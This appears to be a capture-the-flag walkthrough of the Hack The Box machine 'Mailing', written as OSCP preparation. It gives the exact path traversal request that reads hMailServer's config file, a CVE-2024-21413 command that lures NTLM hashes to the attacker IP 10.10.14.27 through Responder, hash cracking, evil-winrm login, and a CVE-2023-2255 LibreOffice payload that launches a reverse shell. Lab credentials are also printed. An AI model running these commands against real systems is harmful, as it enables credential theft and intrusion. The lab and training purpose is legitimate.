---
title: Mailing
date: 2025-05-10
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, file-inclusion, CVE-2024-21413, installed-applications-privesc, CVE-2023-2255 ] 
image: box-mailing.png
media_subpath: /assets/img/posts/2025-05-10-mailingHTB/
---

## Introduction

In this walkthrough, I worked on **Mailing**, an easy-difficulty Windows machine running **hMailServer**. The machine also hosts a website vulnerable to **Path Traversal**. I exploited this vulnerability to access the **hMailServer configuration file**, which revealed the **Administrator password hash**. I successfully cracked this hash to obtain the **Administrator password** for the email account.

Next, I leveraged **CVE-2024-21413** in the **Windows Mail application** on the remote host to capture the **NTLM hash** for the **user `maya`**. Using this hash, I cracked it offline to retrieve **`maya`'s password** and gained access to the system as `maya` via **WinRM**.

For privilege escalation, I exploited **CVE-2023-2255** in **LibreOffice**, which allowed me to escalate privileges and gain higher-level access to the system.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 25,587,465 (SMTP)

Mail Server is most probably open relay:

```bash
telnet $IP 25
```

![image.png](image%202.png)

But the script says not:

```bash
nmap -p25 -Pn --script smtp-open-relay $IP
```

![image.png](image%203.png)

### Port 110,143,993 (POP3, IMAP)

```bash
telnet $IP 143
```

![image.png](image%204.png)

### Port 139/445

- smbclient
    
    ```bash
    smbclient -L //$IP/ -N
    ```
    
    **NT_STATUS_ACCESS_DENIED**
    
- enum4linux
    
    ```bash
    enum4linux $IP
    ```
    
    **No result.**
    

### Port 5985 (WinRM)

## Web

### Port 80

Add domain to `/etc/hosts` file and visit the website:

![image.png](image%205.png)

**Gobuster Scan**

I saw from Wappalyzer that page uses PHP that’s why I am gonna include php extension in search too.

```bash
gobuster dir -u http://mailing.htb/ -w /usr/share/wordlists/dirb/common.txt -t 42 -x .php
```

![image.png](image%206.png)

I didn’t find anything interesting navigating to that pages and directories.

In the website we see the option for downloading instructions:

![image.png](image%207.png)

Let’s intercept that request and analyze.

## Exploitation

[hMAilServer 4.4.2 - 'PHPWebAdmin' File Inclusion](https://www.exploit-db.com/exploits/7012)

We don’t have `initialize.php` at all:

![image.png](image%208.png)

I analyzed instructions.pdf file but didn’t find anything interesting there.

From the GET request we can see obviously that `donwload.php` file tries to include `file` `instructions.pdf`. Let’s try to abuse this include functionality.

- **Absolute Path**
    
    <aside>
    ❗
    
    - Many PHP applications (especially when deployed on Windows) accept forward slashes in paths even on Windows systems because PHP normalizes them.
    - So `/windows/win.ini` gets translated internally by PHP on Windows to `C:\windows\win.ini`.
    </aside>
    
    I tried to include with absolute path first
    
    ![image.png](image%209.png)
    
- **Path Traversal**
    
    I tried first with one `../` and then with two `../../` and the **latter worked.**
    
    ![image.png](image%2010.png)
    
- **RFI**
    
    ![image.png](image%2011.png)
    

Using this I included `php.ini` file:

```bash
GET /download.php?file=..%2F..%2FProgram%20Files%2FPHP8.3.3%2Fphp.ini HTTP/1.1
```

![image.png](image%2012.png)

As we are running hMailServer I tried including `hMailServer.ini` file from:

`\Program Files (x86)\hMailServer\Bin\hMailServer.INI`

![image.png](image%2013.png)

![image.png](image%2014.png)


I checked this for password reuse:

```bash
sudo nxc smb $IP -u administrator -p 'homenetworkingadministrator' --shares
```

![image.png](image%2015.png)

Then I tried logging in IMAP server using these credentials and it worked:

![image.png](image%2016.png)

![image.png](image%2017.png)

We don’t have any emails in IMAP or POP3.

Let’s perform SMTP user enum and identify who could configure hMailServer so that we can use this password against their account.

```bash
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1

```

The hMailServer uses a specific kind of encryption where, in order to decrypt the password field we need to have AdministratorPassword (which we already have) however the problem in order to decrypt that password and use script mentioned in [exploit](https://www.exploit-db.com/exploits/7012) we need to have hMailServer installed on our system.

As we have SMTP protocol, we likely have Mail Client to send emails, and this can be approved from instructions.pdf we obtained before;

![image.png](image%2018.png)

`Windows Mail` is default mail client for Windows machines.

Searching for exploits against this client we encounted CVE discovered in 2024:
[CVE-2024-21413](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability&ved=2ahUKEwiVgYmmxJiNAxVaxgIHHQyFAdkQFnoECB0QAQ&usg=AOvVaw2afJuVrVBBDwPW02PA3Wr8)

We can obtain NTLM hashes of users form `instructions.pdf` we remember the user `maya` where in example they send an email, let’s try this PoC with that username.

```bash
sudo responder -I tun0 -dwv
```

```bash
python3 CVE-2024-21413.py --server "mailing.htb" --port 25 --username administrator@mailing.htb --password homenetworkingadministrator --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url '\\10.10.14.27\test\meeting' --subject "PoC"
```

![image.png](image%2019.png)

```bash
python3 CVE-2024-21413.py --server "mailing.htb" --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url '\\10.10.14.27\test\meeting' --subject "PoC"
```

![image.png](image%2020.png)

```bash
hashcat -m 5600 maya.hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%2021.png)

Now we can use this to connect to the machine with evil-winrm:

```bash
evil-winrm -i $IP -u maya -p 'm4y4ngs4ri'
```

## Privilege Escalation

I have write access to SMB share I am gonna put there `.lnk` file and wait for connection.

```bash
sudo nxc smb $IP -u maya -p 'm4y4ngs4ri' --shares
```

![image.png](image%2022.png)

```bash
python3 hashgrab.py 10.10.14.27 link
```

[https://github.com/xct/hashgrab](https://github.com/xct/hashgrab)

![image.png](image%2023.png)

And run responder:

```bash
sudo responder -I tun0 -dwv
```
## Credentials

```bash
Administrator : homenetworkingadministrator (hMailServer)
0a9f8ad8bf896b501dde74f08efd7e4c
maya : m4y4ngs4ri
```

- **OSCP Checklist**
    
    [PayloadAllTheThings - Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)
    
    - [ ]  Situational Awareness
    - [ ]  SeImpersonatePrivilege
    - [ ]  SeBackupPrivilege
    - [ ]  SeDebugPrivilege
    - [ ]  SeRestorePrivilege
    - [ ]  SeTakeOwnershipPrivilege
    - [ ]  SeManageVolumePrivilege
    - [ ]  SeMachineAccountPrivilege
    - [ ]  [Gaining Full Privileges](https://itm4n.github.io/localservice-privileges/?source=post_page-----b95d3146cfe9---------------------------------------)
    - [ ]  [FullPowers](https://github.com/itm4n/FullPowers - second way of obtaining full privileges)
    - [ ]  PowerShell History(Transcription, Script Logging)
    - [ ]  Sensitive Files
    - [ ]  Insecure Service Executables
    - [ ]  binpath 
    - [ ]  DLL hijacking
    - [ ]  Unquoted Service Path
    - [ ]  Scheduled Tasks
    - [ ]  Application-based exploits
    - [ ]  Detailed [Paper](https://github.com/hatRiot/token-priv) about other privileges 
    - [ ]  Kernel Exploits
    - [ ]  When you're on a Windows box make sure to check the root directory of the local drive volume, each user directory as well as their Desktop and Documents folders, the Program Files folder (usually the x86 one), as well as their PowerShell history if you want to be extra thorough. Do these before using something like winPEAS to save time if you end up finding a config file or script with credentials in it.
    
    ---
    
    [Privileged File Write EOP] (https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)
    

![image.png](image%2024.png)

There is this scheduled task but it is run as `maya`.

![image.png](image%2025.png)

![image.png](image%2026.png)

Enumerating installed x64 applications I have identified LibreOffice 7.4.0.1 is installed:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

![image.png](image%2027.png)

When searching for  public exploits I found `CVE-2023-2255` exploit.


> Improper access control in editor components of The Document Foundation LibreOffice allowed an attacker to craft a document that would cause external links to be loaded without prompt. In the affected versions of LibreOffice documents that used "floating frames" linked to external files, would load the contents of those frames without prompting the user for permission to do so.
{: .prompt-info }

```bash
python3 CVE-2023-2255.py --cmd "c:\tools\reverse.exe" --output "exploit.odt:"
```

Then put `exploit.odt` into Important Documents share and reverse.exe into the place where you want it to be. Then wait for connection.

![image.png](image%2028.png)

## Mitigation

- **Patch hMailServer** and regularly monitor for vulnerabilities like **Path Traversal** to prevent unauthorized access to sensitive configuration files.
- Use **secure storage mechanisms** for sensitive data, such as passwords, and avoid plaintext storage of credentials.
- **Update Windows Mail** and all associated software to protect against CVE-2024-21413 and similar vulnerabilities that allow NTLM hash extraction.
- Regularly rotate and enforce strong password policies to defend against hash-cracking attacks.
- **Regularly update LibreOffice** and apply patches for known vulnerabilities like **CVE-2023-2255** to prevent privilege escalation.
- Implement **multi-factor authentication (MFA)** for all remote access protocols like WinRM to enhance security.
